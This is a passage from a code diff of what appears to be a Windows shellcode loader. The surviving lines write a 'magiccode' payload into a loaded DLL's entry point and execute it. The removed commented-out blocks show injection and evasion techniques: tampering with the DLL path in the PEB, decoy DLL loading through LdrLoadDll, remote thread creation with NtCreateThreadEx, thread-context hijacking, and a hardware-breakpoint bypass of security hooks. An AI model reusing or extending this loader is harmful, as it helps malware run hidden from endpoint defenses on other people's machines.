-    //     wprintf(L"Failed to save modified DLL.\n");
-    //     return 1;
-    // }
-    // // Change the DLL path in the PEB
-    // if (ChangeDllPath(hDll, currentPath_f)) {
-    //     wprintf(L"Successfully changed DLL path to: %ls\n", currentPath_f);
-    // } else {
-    //     wprintf(L"Failed to change DLL path.\n");
-    // }
-    // //Change DLL path in PEB ends.
-
-    // // // change memory to other than MEM_COMMIT:
-    // if (!VirtualProtectEx(hProcess, dllEntryPoint, magiccodeSize, PAGE_NOACCESS, &oldProtect)) {
-    //     printf("VirtualProtectEx failed to change memory protection. Error: %lu\n", GetLastError());
-    //     CloseHandle(hProcess);
-    //     return 1;
-    // } else {
-    //     printf("[+] Memory protection changed to PAGE_NOACCESS\n");
-    // }
 
     if (result) {
         printf("Failed to APC write magiccode. Error: %lu\n", GetLastError());
@@ -1990,332 +1660,6 @@ int main(int argc, char *argv[])
     // Use function pointer to call the DLL entry point 2nd time.
     DLLEntry DllEntry1 = (DLLEntry)((unsigned long long int)hDll + entryPointRVA1);
     (*DllEntry1)((HINSTANCE)hDll, DLL_PROCESS_ATTACH, 0);
-
-
-    
-    // printf("[+] Write custom DLL to current directory \n");
-    // wchar_t currentPath_s[MAX_PATH];
-    // wchar_t currentPath[MAX_PATH];
-
-    // // Obtain the current executable's directory
-    // if (!GetModuleFileNameW(NULL, currentPath_s, MAX_PATH)) {
-    //     wprintf(L"Failed to get current directory. Error: %lu\n", GetLastError());
-    //     return 1;
-    // }
-    // RemoveFileName(currentPath_s);
-    // ConvertToDoubleBackslashes(currentPath_s, currentPath, sizeof(currentPath) / sizeof(currentPath[0]));
-
-
-    // wprintf(L"Directory path: %ls\n", currentPath);
-
-    // errno_t err = wcsncat_s(currentPath, MAX_PATH, L"\fucked.dll", _TRUNCATE);
-    // if (err != 0) {
-    //     wprintf(L"Failed to append DLL name. Error code: %d\n", err);
-    //     return 1;
-    // } else {
-    //     wprintf(L"Current path after appending: %ls\n", currentPath);
-    // }
-    
-    // // Call the function to write the memory content to a new file
-    // if (WriteMemoryToFile(currentPath, hDll, dllSize)) {
-    //     wprintf(L"Modified DLL saved successfully to %s\n", currentPath);
-    // } else {
-    //     wprintf(L"Failed to save modified DLL.\n");
-    //     return 1;
-    // }
-
-    // /// Now we have write the DLL, we can clean the previous dll
-    // if(bUseLdrLoadDll) {
-    //     UnmapViewOfFile(fileBase);
-    //     FreeLibrary(hDll);
-    // } else {
-    //     UnmapViewOfFile(fileHandle);
-    //     UnmapViewOfFile(fileBase);
-    //     CloseHandle(hSection);
-    //     //other method to unload the library:
-    //     // FreeLibraryAndExitThread(hDll, 0);
-    //     // FreeLibrary(hDll); // This is key to unload the library
-    //     // printf("[+] DLL unloaded.\n");
-    // }
-
-
-    // // Load the custom DLL: 
-
-    // fileHandle = CreateFileW(currentPath, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
-    // if (fileHandle == INVALID_HANDLE_VALUE) {
-    //     printf("[-] Failed to open DLL file. Error: %lu\n", GetLastError());
-    //     return 1;
-    // }
-
-    // printf("[+] DLL file opened successfully.\n");
-
-    // UNICODE_STRING unicodeDllPath;
-    // HANDLE moduleHandle = NULL;
-    // ManualInitUnicodeString(&unicodeDllPath, currentPath);
-    // // print unicodeDllPath
-    // wprintf(L"unicodeDllPath: %ls\n", unicodeDllPath.Buffer);
-
-
-
-    // status = LdrLoadDll(NULL, NULL, &unicodeDllPath, (PVOID*)&moduleHandle);
-    // status = LdrLoadDll(NULL, 0, &unicodeDllPath, &moduleHandle);
-    // if (!NT_SUCCESS(status)) {
-    //     wprintf(L"[-] LdrLoadDll failed. Status: %x\n", status);
-    // } else {
-    //     wprintf(L"[+] LdrLoadDll loaded successfully.\n");
-    // }
-    
-
-    // HMODULE hModule = LoadLibraryW(unicodeDllPath.Buffer);
-    // if (!hModule) {
-    //     printf("[-] Failed to load DLL. Error: %lu\n", GetLastError());
-    // } else {
-    //     printf("[+] DLL loaded successfully.\n");
-    // }
-
-    // getchar();
-
-    // // delete the custom DLL on disk:
-    // // if (!DeleteFileW(currentPath)) {
-    // //     wprintf(L"Failed to delete custom DLL. Error: %lu\n", GetLastError());
-    // // } else {
-    // //     wprintf(L"Custom DLL deleted successfully.\n");
-    // // }
-
-    // printf("[+] moduleHandle = %p\n", moduleHandle);
-    // printf("[+] press any key to continue\n");
-    // getchar();
-
-
-    // PIMAGE_DOS_HEADER dosHeader1 = (PIMAGE_DOS_HEADER)moduleHandle;
-    // PIMAGE_NT_HEADERS ntHeader1 = (PIMAGE_NT_HEADERS)((DWORD_PTR)moduleHandle + dosHeader1->e_lfanew);
-    // DWORD entryPointRVA1 = ntHeader1->OptionalHeader.AddressOfEntryPoint;
-    // // //Write to .text section
-    // PVOID dllEntryPoint1 = (PVOID)(entryPointRVA1 + (DWORD_PTR)moduleHandle);
-
-    // PIMAGE_TLS_CALLBACK *callback_decoy;
-    // PIMAGE_DATA_DIRECTORY tls_entry_decoy = &ntHeader1->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
-
-    // if(tls_entry_decoy->Size) {
-    //     PIMAGE_TLS_DIRECTORY tls_dir_decoy = (PIMAGE_TLS_DIRECTORY)((unsigned long long int)moduleHandle + tls_entry_decoy->VirtualAddress);
-    //     callback_decoy = (PIMAGE_TLS_CALLBACK *)(tls_dir_decoy->AddressOfCallBacks);
-    //     for(; *callback_decoy; callback_decoy++)
-    //         (*callback_decoy)((LPVOID)moduleHandle, DLL_PROCESS_ATTACH, NULL);
-    // }
-    // // Use function pointer to call the DLL entry point 2nd time.
-    // DLLEntry DllEntry1 = (DLLEntry)((unsigned long long int)moduleHandle + entryPointRVA1);
-    // (*DllEntry1)((HINSTANCE)moduleHandle, DLL_PROCESS_ATTACH, 0);
-
-
-
-    // Execute the DLL's entry point
-    // PVOID entryPoint = NULL;
-    // if (moduleHandle) {
-    //     // The entry point can typically be found in the PE header's OptionalHeader.AddressOfEntryPoint
-    //     // PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)moduleHandle;
-    //     // PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)moduleHandle + dosHeader->e_lfanew);
-    //     // DWORD entryPointRVA = ntHeaders->OptionalHeader.AddressOfEntryPoint;
-    //     // PVOID entryPoint = (PVOID)((BYTE*)moduleHandle + entryPointRVA);
-
-
-    //     PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)moduleHandle;
-    //     PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)moduleHandle + dosHeader->e_lfanew);
-    //     DWORD entryPointRVA = ntHeader->OptionalHeader.AddressOfEntryPoint;
-    //     entryPoint = (PVOID)(entryPointRVA + (DWORD_PTR)moduleHandle);
-    //     printf("[+] Entry point: %p\n", entryPoint);
-    //     getchar();
-
-    //     // The entry point of a DLL is the DllMain function
-    //     typedef BOOL(WINAPI *DllMainPtr)(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved);
-    //     DllMainPtr dllMain = (DllMainPtr)entryPoint;
-
-    //     // Call the entry point with DLL_PROCESS_ATTACH
-    //     if (dllMain((HINSTANCE)moduleHandle, DLL_PROCESS_ATTACH, NULL)) {
-    //         wprintf(L"DLL entry point executed successfully.\n");
-    //     } else {
-    //         wprintf(L"Failed to execute DLL entry point.\n");
-    //     }
-    // }
-    //Use NT method: 
-
-    // NtCreateThreadEx_t pNtCreateThreadEx = (NtCreateThreadEx_t)dynamic::NotGetProcAddress(GetModuleHandle("ntdll.dll"), "NtCreateThreadEx");
-    // if (!pNtCreateThreadEx) {
-    //     printf("[-] Failed to locate NtCreateThreadEx.\n");
-    //     return 1;
-    // }
-    // HANDLE hThread = NULL;
-    // status = pNtCreateThreadEx(
-    //     &hThread,
-    //     NT_CREATE_THREAD_EX_ALL_ACCESS,
-    //     NULL,
-    //     hProcess,
-    //     entryPoint,
-    //     NULL,
-    //     FALSE,
-    //     0,
-    //     0,
-    //     0,
-    //     NULL);
-
-    // Create a suspended thread using the pNtCreateThreadEx:
-    // suspended thread!!!!!!!!!!!!!!!!!!!!!!!
-    // status = pNtCreateThreadEx(
-    //     &hThread,
-    //     NT_CREATE_THREAD_EX_ALL_ACCESS,
-    //     NULL,
-    //     hProcess,
-    //     dllEntryPoint,
-    //     NULL,
-    //     TRUE,
-    //     0,
-    //     0,
-    //     0,
-    //     NULL);
-    
-    
-    // if (status != 0) {
-    //     printf("[-] Failed to create remote thread: %lu\n", status);
-    //     return 1;
-    // }
-
-
-    // if (hProcess != NULL) {
-    //     result = WriteProcessMemoryAPC(hProcess, (BYTE*)dllEntryPoint, (BYTE*)magiccode, sizeof(magiccode), bUseRtlCreateUserThread, bUseCreateThreadpoolWait); 
-    // }
-    // HANDLE hThread = NULL;
-    // status = pNtCreateThreadEx(
-    //     &hThread,
-    //     NT_CREATE_THREAD_EX_ALL_ACCESS,
-    //     NULL,
-    //     hProcess,
-    //     dllEntryPoint,
-    //     NULL,
-    //     FALSE,
-    //     0,
-    //     0,
-    //     0,
-    //     NULL);
-
-    // if (status != 0) {
-    //     printf("[-] Failed to create remote thread: %lu\n", status);
-    // }
-    // printf("[+] NtCreateThreadEx succeeded\n");
-    
-    
-    // Create a thread to execute at the DLL's entry point
-    // DWORD threadID;
-    // HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)dllEntryPoint, NULL, 0, &threadID);
-    // if (hThread == NULL) {
-    //     printf("Failed to create a thread. Error: %lu\n", GetLastError());
-    //     FreeLibrary(hDll);
-    //     UnmapViewOfFile(fileBase);
-    //     // CloseHandle(fileMapping);
-    //     CloseHandle(fileHandle);
-    //     CloseHandle(hSection);
-    //     return 1;
-    // }
-	// printf("[+] No need to create thread.\n");
-
-    // Wait for the thread to execute and then clean up
-    // WaitForSingleObject(hThread, INFINITE);
-
-    // if(bUseLdrLoadDll) {
-    //     UnmapViewOfFile(fileBase);
-    // } else {
-    //     UnmapViewOfFile(fileHandle);
-    //     UnmapViewOfFile(fileBase);
-    //     // CloseHandle(hSection);
-    // }
-
-    // HMODULE hDll2 = LoadLibraryW(dllPath);
-    // printf("[*] Sleep without Sleep. \n");
-    // SimpleSleep(5000000);
-	// HANDLE new_thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)NULL, NULL, 0, NULL);
-    // if (new_thread == NULL) {
-    //     printf("CreateThread failed: %d\n", GetLastError());
-    //     // return -1;
-    // } else {
-    //     printf("CreateThread succeeded.\n");
-    // }
-    // CONTEXT thread_context = { 0 };
-    // thread_context.ContextFlags = CONTEXT_CONTROL | CONTEXT_INTEGER;
-    // g_thread_handle = new_thread;
-
-    // printf("Attempting bypass using hardware breakpoints\n");
-    // BypassHookUsingBreakpoints();
-
-    // // get the context of the main thread in the new process (used to call its entrypoint)
-    // if (!GetThreadContext(new_thread, &thread_context)) {
-    //     printf("GetThreadContext() Failed with error: %d\n", GetLastError());
-    // }
-	// thread_context.Rax = (DWORD64)dllEntryPoint;
-	// SetThreadContext(new_thread, &thread_context);
-    // getchar();
-
-
-    // CONTEXT context;
-    // ZeroMemory(&context, sizeof(CONTEXT));
-    // context.ContextFlags = CONTEXT_FULL; // Get the full context
-    // if (GetThreadContext(new_thread, &context)) {
-    //     #ifdef _M_IX86 // If the target is x86
-    //     context.Eip = (DWORD64)dllEntryPoint;
-    //     // context.Ecx = (DWORD64)dllEntryPoint;
-    //     #elif defined(_M_X64) // If the target is x64
-    //     context.Rip = (DWORD64)dllEntryPoint;
-    //     // context.R8 = (DWORD64)dllEntryPoint;
-    //     // context.Rcx = (DWORD64)dllEntryPoint;
-    //     // context.Rax = 0xC0000156;
-    //     // set the memory permission to PAGE_EXECUTE_READ WITH context
-
-
-    //     // context.Rcx = (DWORD64)dllEntryPoint;
-    //     #endif
-    //     //print the entry point from context:
-    //     printf("[+] Entry point from context: %p\n", context.Rax);
-
-
-    //     if (!SetThreadContext(new_thread, &context)) {
-    //         // Handle error
-    //         printf("[-] Failed to set thread context: %d\n", GetLastError());
-
-    //     } else {
-    //         // Success
-    //         printf("[+] Thread context set successfully.\n");
-    //     }
-    // }
-
-    // if (ResumeThread(new_thread) == -1) {
-    //     printf("Failed to resume thread: %d\n", GetLastError());
-    // } else {
-    //     printf("[+] Thread resumed successfully.\n");
-    // }
-
-    // MyNtWaitForSingleObject(hThread, FALSE, NULL);
-
-
-    // // Use the NtCreateThreadEx function to create a new thread that starts executing the magiccode
-    // NtCreateThreadEx(&hThread, GENERIC_EXECUTE, 0, hProcess, allocBuffer, 0, 0, 0, 0, 0, 0);
-
-    // Use the NtWaitForSingleObject function to wait for the new thread to finish executing
-
-    //create a function that does the same as NtWaitForSingleObject:
-    // WaitForSingleObject(new_thread, INFINITE);
-
-
-    // printf("[+] press any key to continue\n");
-    // getchar();
-    // if (WaitForSingleObject(hThread, 5000) == WAIT_TIMEOUT) { // Wait 5 seconds
-    //     TerminateThread(hThread, 0); // Forcibly terminates the thread
-    //     printf("[+] Default thread was terminated.\n");
-    // }
-
-    // // Get the exit code of the thread.
-    // DWORD exitCode = 0;
-    // if (!GetExitCodeThread(hThread, &exitCode)) {
-    //     printf("[-] GetExitCodeThread failed: %d\n", GetLastError());
-    // } else {
-    //     printf("[+] Thread exited with code: %lu\n", exitCode);
-    // }
 
     // CloseHandle(hThread);
     // FreeLibrary(hDll);
